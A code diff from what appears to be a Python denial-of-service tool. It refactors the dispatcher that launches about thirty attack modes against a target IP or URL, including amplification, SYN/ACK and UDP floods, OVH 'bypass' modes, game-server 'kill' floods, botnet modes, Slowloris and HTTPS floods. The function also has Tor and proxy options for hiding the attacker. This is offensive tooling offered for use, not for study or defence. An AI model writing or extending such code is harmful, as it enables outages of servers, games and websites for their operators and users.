@@ -55,34 +55,50 @@ def attack(target, port, method, threads, duration, use_tor, tor_lib, use_proxy,
     )
 
     attack_methods = {
-        'NTP': AMPAttack, 'STUN': AMPAttack, 'DNS': AMPAttack, 'WSD': AMPAttack, 'SADP': AMPAttack,
-        'TCP-ACK': TCPAttack, 'TCP-SYN': TCPAttack, 'TCP-BYPASS': TCPAttack, 'OVH-TCP': TCPAttack,
-        'UDP': UDPAttack, 'UDP-VSE': UDPAttack, 'UDP-BYPASS': UDPAttack,
-        'GAME': GameAttack, 'GAME-MC': GameAttack, 'GAME-WARZONE': GameAttack, 'GAME-R6': GameAttack, 'FIVEM-KILL': GameAttack,
-        'SSH': SpecialAttack, 'GAME-KILL': GameAttack,
-        'TCP-SOCKET': SpecialAttack, 'DISCORD': SpecialAttack,
-        'SLOWLORIS': SlowLorisAttack,
-        'UDPBYPASS-BOT': BotnetAttack, 'OVH-HEX': BotnetAttack, 'GREBOT': BotnetAttack, 'TCPBOT': BotnetAttack,
-        'HTTPS-FLOODER': HTTPAttack, 'HTTPS-BYPASS': HTTPAttack, 'HTTP-BROWSER': HTTPAttack, 'HTTPS-ARTERMIS': HTTPAttack,
-        'LOCUST': get_locust_attack()
+        'NTP': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'NTP', CONFIG['duration']),
+        'STUN': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'STUN', CONFIG['duration']),
+        'DNS': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'DNS', CONFIG['duration']),
+        'WSD': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'WSD', CONFIG['duration']),
+        'SADP': lambda: AMPAttack(CONFIG['target_ip'], CONFIG['port'], 'SADP', CONFIG['duration']),
+        'TCP-ACK': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-ACK', CONFIG['duration']),
+        'TCP-SYN': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-SYN', CONFIG['duration']),
+        'TCP-BYPASS': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-BYPASS', CONFIG['duration']),
+        'OVH-TCP': lambda: TCPAttack(CONFIG['target_ip'], CONFIG['port'], 'OVH-TCP', CONFIG['duration']),
+        'UDP': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP', CONFIG['duration']),
+        'UDP-VSE': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP-VSE', CONFIG['duration']),
+        'UDP-BYPASS': lambda: UDPAttack(CONFIG['target_ip'], CONFIG['port'], 'UDP-BYPASS', CONFIG['duration']),
+        'GAME': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME', CONFIG['duration']),
+        'GAME-MC': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-MC', CONFIG['duration']),
+        'GAME-WARZONE': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-WARZONE', CONFIG['duration']),
+        'GAME-R6': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-R6', CONFIG['duration']),
+        'FIVEM-KILL': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'FIVEM-KILL', CONFIG['duration']),
+        'SSH-AUTH': lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], 'SSH-AUTH', CONFIG['duration']),
+        'GAME-KILL': lambda: GameAttack(CONFIG['target_ip'], CONFIG['port'], 'GAME-KILL', CONFIG['duration']),
+        'TCP-SOCKET': lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], 'TCP-SOCKET', CONFIG['duration']),
+        'DISCORD': lambda: SpecialAttack(CONFIG['target_ip'], CONFIG['port'], 'DISCORD', CONFIG['duration']),
+        'SLOWLORIS': lambda: SlowLorisAttack(CONFIG['target_ip'], CONFIG['port'], 'SLOWLORIS', CONFIG['duration']),
+        'UDPBYPASS-BOT': lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], 'UDPBYPASS-BOT', CONFIG['duration']),
+        'OVH-HTTP': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'OVH-HTTP'),
+        'GREBOT-BOT': lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], 'GREBOT-BOT', CONFIG['duration']),
+        'TCPBOT-BOT': lambda: BotnetAttack(CONFIG['target_ip'], CONFIG['port'], 'TCPBOT-BOT', CONFIG['duration']),
+        'HTTPS-FLOODER': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-FLOODER'),
+        'HTTPS-BYPASS': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-BYPASS'),
+        'HTTP-BROWSER': lambda: BrowserAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTP-BROWSER'),
+        'HTTPS-ARTERMIS': lambda: HTTPAttack(CONFIG['target_url'], CONFIG['duration'], 'HTTPS-ARTERMIS'),
+        'LOCUST-HTTP': lambda: get_locust_attack()(CONFIG['target_url'], CONFIG['duration'], 'LOCUST-HTTP')
     }
 
     with Progress() as progress:
         task = progress.add_task(f"[cyan]Запуск {method} атаки...", total=duration)
         start_time = time.time()
         try:
-            if method in ['HTTPS-FLOODER', 'HTTPS-BYPASS', 'HTTP-BROWSER', 'HTTPS-ARTERMIS']:
-                if CONFIG['use_browser'] != 'none':
-                    attack = BrowserAttack(CONFIG['target_url'], CONFIG['duration'], method)
-                else:
-                    attack = attack_methods[method](CONFIG['target_url'], CONFIG['duration'], method)
-                asyncio.run(attack.run())
-            elif method == 'LOCUST':
-                attack = attack_methods[method](CONFIG['target_url'], CONFIG['duration'], method)
-                attack.run()
+            attack_instance = attack_methods[method]()
+            
+            if asyncio.iscoroutinefunction(attack_instance.run):
+                asyncio.run(attack_instance.run())
             else:
-                attack = attack_methods[method](CONFIG['target_ip'], CONFIG['port'], method, CONFIG['duration'])
-                attack.run()
+                attack_instance.run()
+
             while time.time() - start_time < duration:
                 elapsed = time.time() - start_time
                 progress.update(task, completed=elapsed)
